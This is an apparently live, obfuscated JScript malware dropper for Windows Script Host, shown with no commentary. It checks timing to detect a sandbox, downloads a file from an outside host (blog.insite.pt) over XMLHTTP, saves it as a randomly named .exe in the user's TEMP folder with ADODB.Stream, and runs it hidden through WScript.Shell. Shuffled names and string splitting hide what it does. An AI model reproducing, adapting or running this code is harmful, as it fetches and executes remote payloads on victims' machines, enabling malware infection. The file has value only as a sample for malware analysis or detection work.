var J = false;
var sX = "CreateObject";
var E = function CB() {return WScript[sX]("WScript.Shell");}(), GX = 11;
var P = "MSXML2.XMLHTTP";
var ii = 2123213;
var p = 0;
function Zg(R0){E["Run"](R0, p, p);};
function zW(){return "" + P;};
function R(QZ, r){p = p * 1; return QZ - r;};
function Pi(){return sX;};
/*@cc_on
  @if (@_win32 || @_win64)
    J = true;
  @end
@*/
if (J)
{
var aY = "";
function sH(){return 22;};
var R1 = 0; var hw = 0;
function t()
{
var y = new this["Date"]();
var A = y["getUTCMilliseconds"]();
WScript["Sleep"](sH());
var y = new this["Date"]();
var W = y["getUTCMilliseconds"]();
WScript["Sleep"](sH());
var y = new this["Date"]();
var wn = y["getUTCMilliseconds"]();
var R1 = "u";
R1 = R(W, A);
var hw = "h";
hw = R(wn, W);
aY = "open";
return R(R1, hw);
}
var Nj = false;
var k = false;
for (var Z = p; Z < sH() * 1; Z++){if (t() != p){
Nj = true; 
hw = "31" + 11 * R1 + hw; 
k = true; 
break;
}}
function pl() {return ((Nj == true) && (Nj == k)) ? 1 : p;};
if (Nj && pl() && k){
function Pa() {return E["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "5eUmT2twG31SMg.exe";};
 i = zW();
 Sc = WScript[sX](i);
 var V = 1;
 while (V){
try {
Sc[aY]("GET", "http://blog.insite.pt/m8djs", false);
Sc["send"]();
Sl = "Sleep";
for (;;){WScript[Sl](sH() * 11); if (Sc["readystate"] >= 2 * 2) break;};
V = p;
} catch(j){};
}
function f(fc) {var e = (1, 2, 3, 4, 5, fc); return e;};
x = WScript[Pi()]("ADODB.Stream");
i = x;
i[aY]();
i["type"] = f(1);
i["write"](Sc["ResponseBody"]);
x["position"] = f(p);
i["Save" + "ToFile"](Pa(), 2);
x["c"+"lose"]();
Ky = Pa();
Zg(Ky);
}
}

